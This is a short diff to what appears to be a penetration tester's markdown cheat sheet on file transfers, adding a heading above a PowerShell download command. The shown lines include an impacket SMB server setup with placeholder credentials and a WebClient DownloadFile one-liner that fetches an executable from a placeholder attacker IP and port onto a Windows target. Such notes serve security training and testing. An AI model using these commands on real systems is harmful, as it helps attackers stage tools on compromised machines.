@@ -96,6 +96,7 @@ base64
 
 copy contents of file to clipboard
 `Get-Content <FILENAME> | Set-Clipboard`
+
 #### network file transfers
 smb setup on nix
 `$ sudo ./smbserver.py tools $(pwd) -smb2support -user dials -password password1`
@@ -108,6 +109,7 @@ create cred object
 cd dials:
 ```
 
+#### PowerShell New-Object
 download file
 `(New-Object System.Net.Webclient).DownloadFile("http://<IP>:<PORT>/<FILENAME>.exe","C:\<FILENAME>.exe")`
 
